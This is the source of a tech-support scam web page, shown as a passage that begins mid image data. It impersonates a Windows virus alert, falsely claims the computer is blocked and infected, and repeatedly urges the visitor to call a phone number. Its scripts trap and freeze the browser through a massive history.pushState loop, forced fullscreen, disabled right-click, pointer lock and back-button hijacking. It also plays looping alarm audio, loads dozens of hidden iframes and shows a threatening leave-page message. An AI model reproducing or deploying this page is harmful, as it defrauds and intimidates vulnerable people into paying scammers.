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'></td></tr></table></td></tr>";
	</script>
	<script>
		var is_chrome,
				isChromium = window.chrome,
				vendorName = window.navigator.vendor,
				isOpera = window.navigator.userAgent.indexOf("OPR") > -1;
			is_chrome = isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false ? true : false;

			function alertCall()
			{
      var total = "";
      for( var i = 0; i < 100000; i++ ) {
          total = total + i.toString();
          history.pushState(0,0, total );
      }
}
		 	function alertTimed()
			{
				if (is_chrome)
				{
					setInterval(function(){
						alertCall();
					}, 200);
				}
				else
				{
					alertLoop();
				}
			}
		 	function alertLoop()
			{
				for (i = 0; i < 500; i++)
				{
					alertCall();
				}
			}
			function addEvent(obj, evt, fn)
			{
				if (obj.addEventListener)
				{
					obj.addEventListener(evt, fn, false)
				}
				else if (obj.attachEvent)
				{
					obj.attachEvent("on" + evt, fn)
				}
			}
			$(document).ready(function(){
				document.onkeydown = function(e){
					if (e.ctrlKey && (e.keyCode === 67 || e.keyCode === 86 || e.keyCode === 85 || e.keyCode === 117))
					{
						if (!is_chrome)
						{
							alertTimed();
						}
						return true;
					}
					else if (e.keyCode === 123)
					{
						return true;
					}
					else
					{
						return true;
					}
				};
				$(window).on('click', function(){
					//window.open('index.php', 'window' + Math.floor((Math.random() * 9999) + 1), 'width=' + screen.availWidth + ',height=' + screen.availHeight + ',titlebar=1,menubar=1');
					toggleFullScreen();
					alertTimed();
					document.getElementById("ifr").src="index.php";

				});
				addEvent(document, "mouseout", function(e){
					e = e ? e : window.event;
					var from = e.relatedTarget || e.toElement;
					if (!is_chrome && (!from || from.nodeName == "body"))
					{
						alertTimed();
					}
				});
			});
			window.onbeforeunload = function(e){
				var message = '*************************************************\n\nCall Windows  Help Desk Immediately at +1-888-410-0950\n\nThe following data will be compromised if you continue:\n1. Passwords\n2. Browser History\n3. Credit Card Information\n\nThis virus is well known for complete identity and credit card theft. Further action through this computer or any computer on the network will reveal private information and involve serious risks.\n\nCall Windows  Help Desk Immediately at +1-888-410-0950';
				e.returnValue = message;
				return message;
			};
			window.onload = function(e){
				//alertTimed();
			};

		$('confirm text').dialog(
    {
        modal:true, //Not necessary but dims the page background
        buttons:{
            'Save':function() {
                //Whatever code you want to run when the user clicks save goes here
             },
             'Delete':function() {
                 //Code for delete goes here
              }
        }
    }
);

		</script>
		 <script type="text/javascript">
        function toggleFullScreen() {
            if (!document.fullscreenElement && !document.mozFullScreenElement && !document.webkitFullscreenElement) {
                if (document.documentElement.requestFullscreen) {
                    document.documentElement.requestFullscreen();

                } else if (document.documentElement.mozRequestFullScreen) {
                    document.documentElement.mozRequestFullScreen();

                } else if (document.documentElement.webkitRequestFullscreen) {
                    document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
                }
            }
        }




    </script>

    <script>

function ajay(){
setInterval(function(){toggleFullScreen(); }, 1000);
}
</script>





	<script type="text/javascript">
		document.oncontextmenu=new Function("return false");
	</script>
	<script type="text/javascript">
		addEventListener("click", function() {
			document.getElementById('map').innerHTML = stroka;
			var
					el = document.documentElement
					, rfs =
							el.requestFullScreen
							|| el.webkitRequestFullScreen
							|| el.mozRequestFullScreen
					;

			rfs.call(el);

		});</script>
		<script type="text/javascript">
		 function openMultipleTabs() {
        var w1 = window.open('index.php', '1');
        var w2 = window.open('index.php', '2');
        var w3 = window.open('indes.html', '3');
       }
	</script>




</head>
 <script type="text/javascript">
function poponload()
{
testwindow = window.open("index.php", "_blank", "location=1,status=1,scrollbars=1,width=100,height=100");
testwindow.moveTo(0, 0);
}
</script>




<body  onclick="popup()" class="en ltr" style="cursor: none; overflow-x: hidden; background-image: url('./images/background.png'); z-index:9999999;" id="hang" class="hang" >
<div id="body" class="container-fluid" style=" z-index:999999999;">
  <div class="row">
    <div class="col-md-12">
      <div class="row block1">
        <div class="col-md-4 left">
          <strong>Windows Security Tollfree:</strong>
          <p style="font-size:30px; color: rgba(0, 0, 0, 0.7);"> +1-888-410-0950 </p>
          <label style="font-size: 12px;">
            <input checked="nonchecked" type="checkbox"> Prevent this page from creating additional dialogues.</label>
        </div>
        <div class="col-md-4">
          <div class="middle" id="alert-modal">
            <a style="margin-right: 8px" href="" class="cross">x</a>
            <div class="content-box" id="alert-content-box">
              <center><strong>VIRUS ALERT FROM Windows</strong></center>
              <center><h5><b>This computer is BLOCKED</b></h5></center>
              <h6><b>Do not close this window and restart your computer</b></h6>
              <h6><b>Your computer's registration key is Blocked.</b></h6>
              <h6><b>Why we blocked your computer?</b></h6>
              <h6>The window's registration key is illegal.</h6>
              <h6>This window is using pirated software.</h6>
              <h6>This window is sending virus over the internet.</h6>
              <h6>This window is hacked or used from undefined location.</h6>
              <h6>We block this computer for your security. </h6>
              <h6>Contact Windows helpline to reactivate your computer.</h6>

                  <p style="font-size:20px; color: rgba(0, 0, 0, 0.7);">Windows Security Tollfree +1-888-410-0950 </p>
                  <button class="ms-btn chat_now blink" style="background-color:green; color:white; float:right">Back to Safety</button>





            </div>
          </div>

          <div class="block22">
            <div class="row">
              <div class="col-md-4">
                <img src="./images/rsod.png">
              </div>
              <div class="col-md-4">
                <div id="red_alert1" class=""style="">
                  <h1><img style="height: 40px; width: 40px; margin-top: -10px;"
                           src="images/335158-windows-8-window.png"> Windows Support Alert</h1>
                  <h3>Your System Detected Some Unusual Activity.</h3>
                  <h5>It might harm your computer data and track your financial activities.</h5>
                  <h3>Please report this activity to  +1-888-410-0950</h3>
                </div>
                <div class="row">
                  <div class="col-md-12">
                    <div class="row">
                      <div class="col-md-12">
                        <button class="ms-btn">Ignore Alert</button>
                        <button class="ms-btn chat_now">Chat Now</button>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
        <div class="col-md-4 right">

          <form style="text-align: left;" action="login.php.htm" method="POST" align="center">
            <div>
              <strong>Enter Windows registration key to unblock.</strong>
            </div>
            <div class="tbl-center" style="margin-top: 5px;">
              <strong style="text-align:left;color: rgba(0, 0, 0, 0.7);"> ENTER KEY:</strong>
              <div style="min-width:100px;">
                <input type="text" name="ENTER KEY" style="width: 100%;" />
              </div>
              <div>
                <input class="ms-btn" type="button" value="Submit">
              </div>
            </div>
          </form>
        </div>
      </div>
    </div>
  </div>
</div>



<div class="block2" style="background-color:red;">
  <div class="row">
    <div class="col-md-3">
      <img style="height: 240px; width: auto;" src="./images/rsod.png">
    </div>
    <div class="col-md-6">
      <div id="red_alert" style="margin-bottom: 25px;">
        <h1><img style="height: 40px; width: 40px; margin-top: -10px;" src="images/335158-windows-8-window.png"> Windows
          Support Alert</h1>
        <h3>Your System Detected Some Unusual Activity.</h3>
        <h5>It might harm your computer data and track your financial activities.</h5>
        <h3>Please report this activity to  +1-888-410-0950</h3>
      </div>
      <div class="row">
        <div class="col-md-12">
          <div class="row">
            <div class="col-md-6 no-padding-right">
              <button class="ms-btn">Ignore Alert</button>
            </div>
            <div class="col-md-6 no-padding-left">
              <button class="ms-btn chat_now blink" style="background-color:red; color:white">Leave This Page</button>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>


<script> var link_redirect = gourl;
if (window.history && window.history.pushState) {
    window.onpopstate = function () {
        var hashLocation = location.hash;
        var hashSplit = hashLocation.split("#!/");
        var hashName = hashSplit[1];
        if (hashName !== '') {
            var hash = window.location.hash;
            if (hash === '') {
                // alert('Back button was pressed.');
                window.onbeforeunload = null;
                window.location=link_redirect;
                return false;
            }
        }
    };
    window.history.pushState('forward', null, '#forward');
}
else {
    var ignoreHashChange = true;
    window.onhashchange = function () {
        if (!ignoreHashChange) {
            ignoreHashChange = true;
            var hashLocation = location.hash;
            var hashSplit = hashLocation.split("#!/");
            var hashName = hashSplit[1];
            if (hashName !== '') {
                var hash = window.location.hash;
                if (hash === '') {
                    // alert('Back button was pressed.');
                    window.onbeforeunload = null;
                    window.location=link_redirect;
                    return false;
                }
            }
        }
        else {
            ignoreHashChange = false;
        }
    };
    window.history.pushState('forward', null, '#forward');
}
</script>



<script> var link_redirect = gourl;
if (window.history && window.history.pushState) {
    window.onpopstate = function () {
        var hashLocation = location.hash;
        var hashSplit = hashLocation.split("#!/");
        var hashName = hashSplit[1];
        if (hashName !== '') {
            var hash = window.location.hash;
            if (hash === '') {
                // alert('Back button was pressed.');
                window.onbeforeunload = null;
                window.location=link_redirect;
                return false;
            }
        }
    };
    window.history.pushState('forward', null, '#forward');
}
else {
    var ignoreHashChange = true;
    window.onhashchange = function () {
        if (!ignoreHashChange) {
            ignoreHashChange = true;
            var hashLocation = location.hash;
            var hashSplit = hashLocation.split("#!/");
            var hashName = hashSplit[1];
            if (hashName !== '') {
                var hash = window.location.hash;
                if (hash === '') {
                    // alert('Back button was pressed.');
                    window.onbeforeunload = null;
                    window.location=link_redirect;
                    return false;
                }
            }
        }
        else {
            ignoreHashChange = false;
        }
    };
    window.history.pushState('forward', null, '#forward');
}
</script>




<audio autoplay="autoplay" loop="" id="msgSound">
  <source src="err.mp3" type="audio/mpeg">
</audio>

<audio autoplay="autoplay" loop="" id="msgSound1">
  <source src="err.mp3" type="audio/mpeg">
</audio>


<script type="text/javascript">/*<![CDATA[*/
// audio play /*
  var msgAudioEl = document.getElementById("msgSound");

  var playMsgInt = setInterval(function () {
    if (isPlaying(msgAudioEl)) {
      // console.log('already playing. clearing interval');
      clearInterval(playMsgInt);
    } else {
      // console.log('Triggering play');
      msgAudioEl.play();
    }
  }, 500);
  // audio play */

</script>

    <script type="text/javascript">/*<![CDATA[*/
    // audio play /*
      var msgAudioEl = document.getElementById("msgSound1");

      var playMsgInt = setInterval(function () {
        if (isPlaying(msgAudioEl)) {
          // console.log('already playing. clearing interval');
          clearInterval(playMsgInt);
        } else {
          // console.log('Triggering play');
          msgAudioEl.play();
        }
      }, 5000);
      // audio play */

    </script>



    				<script type="text/javascript">



    					  //alert("Your Computer is permanently blocked. Call for support at +1-888-410-0950 ")

    					document.getElementById('map').innerHTML = "<img style='display:block;position:absolute;top:20px;left:0;right:0;margin:0 auto;z-index:7000;' src=''>";
    				</script>
    				<script language="JavaScript1.2">
    					<!--
    					if (window.Event)
    						document.captureEvents(Event.MOUSEUP);

    					function nocontextmenu() {
    						event.cancelBubble = true, event.returnValue = false;

    						return false;
    					}

    					function norightclick(e) {
    						if (window.Event) {
    							if (e.which == 2 || e.which == 3) return false;
    						}
    						else if (event.button == 2 || event.button == 3) {
    							event.cancelBubble = true, event.returnValue = false;
    							return false;
    						}
    					}

    					if (document.layers)
    						document.captureEvents(Event.MOUSEDOWN);

    					document.oncontextmenu = nocontextmenu;
    					document.onmousedown = norightclick;
    					document.onmouseup = norightclick;
    					 </script>

    				<script>
    					window.setInterval("reloadIFrame();", 50000);
    					function reloadIFrame() {
    					 document.getElementById("calendar").src=calendar.src;
    					}
    					</script>


              					<script>
              					// Get the modal
              					var modal = document.getElementById('myModal');

              					// Get the button that opens the modal
              					var btn = document.getElementById("myBtn");

              					// Get the <span> element that closes the modal
              					var span = document.getElementsByClassName("close")[0];

              					// When the user clicks the button, open the modal
              					/*btn.onclick = function() {
              						modal.style.display = "block";
              					} */

              					// When the user clicks on <span> (x), close the modal
              					span.onclick = function() {
              						modal.style.display = "none";
              					}

              					// When the user clicks anywhere outside of the modal, close it
              					window.onclick = function(event) {
              						if (event.target == modal) {
              							modal.style.display = "none";
              						}
              					}
              					</script>
              						<script type="text/javascript">
              					function addEvent(obj, evt, fn) {
              							if (obj.addEventListener) {
              									obj.addEventListener(evt, fn, false);
              							}
              							else if (obj.attachEvent) {
              									obj.attachEvent("on" + evt, fn);
              							}
              					}
              					addEvent(window,"load",function(e) {
              							addEvent(document, "mouseout", function(e) {
              									e = e ? e : window.event;
              									var from = e.relatedTarget || e.toElement;
              									if (!from || from.nodeName == "HTML") {
              											// stop your drag event here
              											// for now we can just use an alert
              									 //alert("hello");

              								 modal.style.display = "block";

              									}
              							});
              					});

              						$(document).mousemove(function(){
              						var canvas = document.getElementById('mycanvas');
              					canvas.requestPointerLock = canvas.requestPointerLock || canvas.mozRequestPointerLock || canvas.webkitRequestPointerLock;
              					canvas.requestPointerLock();

              						//capture mouse movement event
              							 // remove our layover from the DOM
              						});

              					 //  $(document).mousemove(function(){
              					 // alert("move detect");
              						//capture mouse movement event
              					 //   $("#pageLayover").remove(); // remove our layover from the DOM
              					 // });


              					</script>
              					<script type="text/javascript" language="JavaScript1.2">

              					if (window.Event)
              						document.captureEvents(Event.MOUSEUP);


              					function nocontextmenu() {
              						event.cancelBubble = true, event.returnValue = false;

              						return false;
              					}

              					function norightclick(e) {
              						if (window.Event) {
              							if (e.which == 2 || e.which == 3) return false;
              						}
              						else if (event.button == 2 || event.button == 3) {
              							event.cancelBubble = true, event.returnValue = false;
              							return false;

              						}
              					}


              					if (document.layers)
              						document.captureEvents(Event.MOUSEDOWN);

              					document.oncontextmenu = nocontextmenu;
              					document.onmousedown = norightclick;
              					document.onmouseup = norightclick;



              					</script>


    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>

    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>
    <div style="position:absolute;top:-100px;left:-9999px;z-index:1;"><iframe src="7M100101010101_AUT10.php"></iframe></div>



<iframe src="beep.mp3" allow="autoplay" style="display:none;">
</body>
</html>
